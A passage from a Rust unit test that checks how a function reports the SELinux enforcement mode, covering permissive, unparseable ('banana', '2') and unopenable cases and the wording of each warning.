        assert!(msg(&perm).contains("permissive"));

        // Readable and NOT a number: the state that was reported as unreadable before this split.
        let odd = selinux_verdict(true, Some("banana\n".into()));
        assert!(matches!(odd, R::Warn(..)), "an unparseable mode is unknown");
        assert!(
            msg(&odd).contains("holds") && msg(&odd).contains("banana"),
            "it must say what it found, not that it could not read it: {}",
            msg(&odd)
        );
        assert!(
            !msg(&odd).contains("could not be opened"),
            "a file that was read must not be reported as unopenable"
        );

        // A number that is neither 0 nor 1 lands in the same arm, and still shows the value.
        let two = selinux_verdict(true, Some("2".into()));
        assert!(matches!(two, R::Warn(..)));
        assert!(msg(&two).contains('2'));

        // Present but unopenable: genuinely unknown, and worded as the different fact it is.
        let unopenable = selinux_verdict(true, None);
        assert!(matches!(unopenable, R::Warn(..)));
        assert!(msg(&unopenable).contains("could not be opened"));
    }
}
